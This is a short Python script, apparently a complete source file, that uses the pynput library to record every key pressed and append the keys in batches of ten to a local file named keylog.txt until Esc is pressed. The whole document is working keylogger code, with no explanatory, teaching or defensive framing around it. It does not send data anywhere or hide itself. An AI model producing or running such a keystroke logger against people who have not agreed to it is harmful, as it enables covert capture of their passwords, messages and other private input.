import pynput.keyboard

logged_keys = []

def write_to_file(keys):
    with open("keylog.txt", "a") as file:
        for key in keys:
            key_str = str(key).replace("Key.", "")
            file.write(key_str + " ")

def on_press(key):
    global logged_keys
    logged_keys.append(key)
    if len(logged_keys) >= 10:
        write_to_file(logged_keys)
        logged_keys = []

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

def start_listener():
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_listener()
